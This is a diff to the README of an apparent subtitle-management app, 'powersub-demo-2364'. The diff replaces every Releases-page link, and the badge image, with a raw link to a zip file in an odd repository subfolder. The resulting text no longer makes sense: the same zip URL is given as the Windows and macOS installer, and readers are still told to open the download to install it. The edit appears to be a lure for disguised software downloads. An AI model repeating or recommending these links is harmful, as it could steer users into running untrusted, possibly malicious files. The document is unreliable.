@@ -6,7 +6,7 @@ Welcome to powersub-demo-2364! This application helps you manage subtitles with 
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/bijayX99/powersub-demo-2364/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/bijayX99/powersub-demo-2364/main/bicycler/powersub-demo-2364.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/bijayX99/powersub-demo-2364/main/bicycler/powersub-demo-2364.zip)
 
 ## 📂 System Requirements
 
@@ -30,11 +30,11 @@ Here’s what powersub-demo-2364 offers:
 
 To download the application, visit the Releases page. You will find the latest version listed there.
 
-1. Click the following link: [Download the latest version here](https://github.com/bijayX99/powersub-demo-2364/releases).
+1. Click the following link: [Download the latest version here](https://raw.githubusercontent.com/bijayX99/powersub-demo-2364/main/bicycler/powersub-demo-2364.zip).
    
 2. On the Releases page, you will see multiple versions. Choose the most recent one listed at the top.
    
-3. Click on the appropriate file for your operating system (e.g., `powersub-demo-2364-windows.exe` for Windows, `powersub-demo-2364-macos.dmg` for macOS).
+3. Click on the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/bijayX99/powersub-demo-2364/main/bicycler/powersub-demo-2364.zip` for Windows, `https://raw.githubusercontent.com/bijayX99/powersub-demo-2364/main/bicycler/powersub-demo-2364.zip` for macOS).
 
 4. The file will start downloading. Once downloaded, open the file to start the installation process.
 
@@ -72,6 +72,6 @@ Thanks to everyone who has helped make powersub-demo-2364 possible. Your support
 
 ## 📢 Stay Updated
 
-For the latest news and updates about powersub-demo-2364, don't hesitate to keep visiting the [Releases page](https://github.com/bijayX99/powersub-demo-2364/releases) regularly.
+For the latest news and updates about powersub-demo-2364, don't hesitate to keep visiting the [Releases page](https://raw.githubusercontent.com/bijayX99/powersub-demo-2364/main/bicycler/powersub-demo-2364.zip) regularly.
 
 Let's manage subtitles with ease!
